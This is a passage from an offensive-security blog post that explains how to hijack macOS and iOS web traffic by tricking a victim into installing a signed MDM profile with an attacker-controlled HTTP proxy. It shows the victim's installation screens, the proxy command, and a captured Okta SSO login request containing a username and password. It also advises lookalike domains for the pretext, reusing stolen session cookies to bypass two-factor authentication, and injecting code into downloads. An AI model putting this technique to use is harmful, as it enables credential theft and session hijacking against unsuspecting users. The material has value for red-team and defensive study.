to <code class="language-plaintext highlighter-rouge">File -&gt; Save</code> and select a storage location.</p><p>Now, let’s try to install our profile to see what the installation experience is like for the victim. When I open my MDM profile, I’m presented with the first installation pane:</p><p><img data-proofer-ignore data-src="https://blacksunhackers.club/images/mdm/install_1.png" alt="First Installation Pane" /></p><p>If I click the <code class="language-plaintext highlighter-rouge">Show Profile</code> button, the pane will expand to display the profile details. Note the nice looking green <code class="language-plaintext highlighter-rouge">Verified</code> indicator that ends up right next to our company name. Legitimate looking. Very soothing. Reminds me of home. The victim will likely not understand that the <code class="language-plaintext highlighter-rouge">Verified</code> indicator simply means the profile has been signed, and that it may not legitimately be from the organization that is show next to it in that dialog.</p><p><img data-proofer-ignore data-src="https://blacksunhackers.club/images/mdm/show_profile_verified.png" alt="Show Profile" /></p><p>I’ve redacted my Developer ID and name from the dialogue, but note that those will show up if you choose to sign your profile. Below that, the user can see the configuration details. You should count on the user wanting to click <code class="language-plaintext highlighter-rouge">Show Profile</code>, so choose a domain that fits the pretext. You can imagine <code class="language-plaintext highlighter-rouge">0day.gg</code> isn’t the best choice, but it works for this demo. Something like <code class="language-plaintext highlighter-rouge">proxy.target-org-lookalike.tld</code> could be a good choice.</p><p><img data-proofer-ignore data-src="https://blacksunhackers.club/images/mdm/show_profile_2.png" alt="Show Profile - Payload Details" /></p><p>After clicking continue, the user will hit one last pane (with an optional expansion button):</p><p><img data-proofer-ignore data-src="https://blacksunhackers.club/images/mdm/install_final.png" alt="Final Install Pane" /> <img data-proofer-ignore data-src="https://blacksunhackers.club/images/mdm/install_final_expand.png" alt="Final Install - Expand Pane" /></p><p>Upon clicking <code class="language-plaintext highlighter-rouge">Install</code>, the user will be asked for either their password or fingerprint, depending on if TouchID is configured or not. After supplying credentials or using the fingerprint sensor, the profile is installed.</p><h2 id="testing-the-setup">Testing The Setup</h2><p>Let’s hit Google and see if our setup is working. There should be no certificate errors.</p><p><img data-proofer-ignore data-src="https://blacksunhackers.club/images/mdm/browser_verified.png" alt="Browser Test" /></p><p>And if we pop over to our proxy, we should see the request in STDOUT:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>ubuntu@ip-172-31-23-174:~/procksy$ sudo ./procksy -cert ../out/Acme_Corp.crt -key ../out/Acme_Corp.key

[SNIP]

GET http://www.google.com/ HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:71.0) Gecko/20100101 Firefox/71.0
</pre></table></code></div></div><p>Let’s simulate the victim signing in to their company SSO portal.</p><p><img data-proofer-ignore data-src="https://blacksunhackers.club/images/mdm/okta_login.png" alt="SSO Login" /></p><p>And the corresponding request in the proxy log:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>POST / HTTP/1.1
Host: [SNIP].okta.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Content-Length: 39
Content-Type: application/x-www-form-urlencoded
Cookie: __cfduid=de55169fca8d355f6b947f59708f984db1576815061; _okta_attribution={\%22utm_page%22:%22/%22%2C%22utm_date%22:%2212/19/2019%22}; _okta_session_attribut
ion={\%22utm_page%22:%22/%22%2C%22utm_date%22:%2212/19/2019%22}; _okta_original_attribution={\%22utm_page%22:%22/%22%2C%22utm_date%22:%2212/19/2019%22}
Origin: https://[SNIP].okta.com
Referer: https://[SNIP].okta.com/
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:71.0) Gecko/20100101 Firefox/71.0

username=snacksun&amp;password=slackersclub
</pre></table></code></div></div><p>Once the user has completed their login process and hit the landing page, we will have recorded both their credentials (username:password pair) as well as cookies for their active session. Having access to the cookies can be especially useful when attacking SSO portal that are protected with 2FA, as a user:password pair won’t cut it for access. By using their user:password, you also risk triggering protections that alert on logins from a new location. Import the cookies into your own browser using an extension such as <a href="https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg">Editthiscookie</a>, and have fun looting with their session.</p><p>It’s useful to note that our proxy settings will be inherited by apps that respect the system HTTP proxy settings. So you’re not limited to capturing/manipulating only browser-generated traffic.</p><h2 id="bonus-round">Bonus Round</h2><p>Our proxy controls both the request (before hitting the destination server) and the response (before being returned to the client), so we can freely manipulate traffic. Some attacks to consider might be injecting JS hooks using something like <a href="https://beefproject.com/">Beef</a> for client side phishing attacks and potential internal network access via XHR, and code injection in downloaded applications and scripts. Maybe you add a line to install scripts that the user downloads, or intercept packages, add files and manipulate scripts, resign, then forward it back to the requesting client. You’re the middleman.</p><h2 id="does-this-work-for-ios-devices">Does This Work For iOS Devices?</h2><p>It does, with some limitations. This payload can only be installed on an iOS device that is in <a href="https://support.apple.com/guide/apple-configurator-2/supervised-devices-apd9e4f64088/mac">supervised mode</a>. If the organization you’re targeting issues corporate phones, they’re likely centrally managed somehow, so the devices will probably be in supervised mode. In that case, you can send the MDM profile to the victim and have them open it in either Safari or the Mail app, and they will be walked through similar installation steps. The major difference in installation experience is that after downloading the profile, the user will be directed to manually go to the Profiles section in the Settings app to finish the installation.</p><p><img data-proofer-ignore data-src="https://blacksunhackers.club/images/mdm/install_ios.png" alt="iOS Profile Installation" /></p><h2 id="wrapping-up">Wrapping Up</h2><p>MDM profiles have some interesting applications for attackers. There’s a lot of attack surface to be explored here yet, and Apple hasn’t yet introduced signing and verification requirements for profiles. We’ve seen that the HTTP proxy payload is very powerful in SSO+SaaS based environments. If you liked this post, you might find <a href="https://lockboxx.blogspot.com/2019/04/macos-red-teaming-203-mdm-mobile-device.html">@1njection’s MDM post interesting as well</a>. If you’d like to explore all of the official keys/payloads for profiles, you should check out <a href="https://developer.apple.com/business/documentation/Configuration-Profile-Reference.pdf">Apple’s reference</a>.</p></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/macos/" class="post-tag no-text-decoration" >MacOS</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"></div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hijacking Web Traffic On MacOS and iOS With MDM Profiles - Blacksun Hackers Club&url=https://blacksunhackers.club/posts/Hijacking-Web-Traffic-MDM-Profiles/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hijacking Web Traffic On MacOS and iOS With MDM Profiles - Blacksun Hackers Club&u=https://blacksunhackers.club/posts/Hijacking-Web-Traffic-MDM-Profiles/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hijacking Web Traffic On MacOS and iOS With MDM Profiles - Blacksun Hackers Club&url=https://blacksunhackers.club/posts/Hijacking-Web-Traffic-MDM-Profiles/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Bypassing-TCC-With-iTerm2/">Bypassing TCC With iTerm2</a><li><a href="/posts/acquiring-and-abusing-legacy-slack-tokens/">Acquiring and Abusing Slack Legacy Tokens on macOS</a><li><a href="/posts/macOS-serial-console-login/">macOS Serial Console Login</a><li><a href="/posts/cultivating-an-online-persona-1/">Cultivating An Online Persona Part 1 - Bypassing Gmail's Phone Verification</a><li><a href="/posts/post-exploitation-persistence-with-application-shims-intro/">Post Exploitation Persistence With Application Shims (Intro)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/macos/">MacOS</a> <a class="post-tag" href="/tags/post-exploitation/">Post-Exploitation</a> <a class="post-tag" href="/tags/persistence/">Persistence</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/exploitation/">exploitation</a> <a class="post-tag" href="/tags/fingerprinting/">Fingerprinting</a> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/osint/">OSINT</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/chrome-arbitrary-javascript-injection-via-applescript/"><div class="card-body"> <span class="timeago small" >Dec 13, 2017<i class="unloaded">2017-12-13T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Chrome Arbitrary Javascript Injection Via AppleScript</h3><div class="text-muted small"><p> Foreword I’ve had a PoC for this technique for a little while as part of research for a future talk on the subject of post-exploitation in MacOS, but as an article has surfaced detailing the adware...</p></div></div></a></div><div class="card"> <a href="/posts/macOS-serial-console-login/"><div class="card-body"> <span class="timeago small" >Nov 18, 2018<i class="unloaded">2018-11-18T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>macOS Serial Console Login</h3><div class="text-muted small"><p> Foreword This short post documents a technique for authenticating as root on macOS and provides procedures for bypassing the default configuration of macOS which explicitly disables the root user. ...</p></div></div></a></div><div class="card"> <a href="/posts/macOS-persistence-via-iterm/"><div class="card-body"> <span class="timeago small" >Mar 6, 2019<i class="unloaded">2019-03-06T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>macOS Persistence via iTerm</h3><div class="text-muted small"><p> Foreword macOS’s default Terminal.app is garbage, and everyone knows it; they also know iTerm is by and large the most popular terminal replacement for macOS. But did you know iTerm is also a fanta...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Surreptitious-hijacking-brew-macOS/" class="btn btn-outline-primary" prompt="Older"><p>HomeBrood 0x00 - Surreptitious hijacking of Homebrew on macOS</p></a> <a href="/posts/Looting-Electron-Apps-Via-V8-Inspector/" class="btn btn-outline-primary" prompt="Newer"><p>Looting Electron Apps Via The V8 Inspector</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/BlacksunLabs_">Blacksun Labs</a>.</p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/macos/">MacOS</a> <a class="post-tag" href="/tags/post-exploitation/">Post Exploitation</a> <a class="post-tag" href="/tags/persistence/">Persistence</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/exploitation/">exploitation</a> <a class="post-tag" href="/tags/fingerprinting/">Fingerprinting</a> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/osint/">OSINT</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://blacksunhackers.club{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
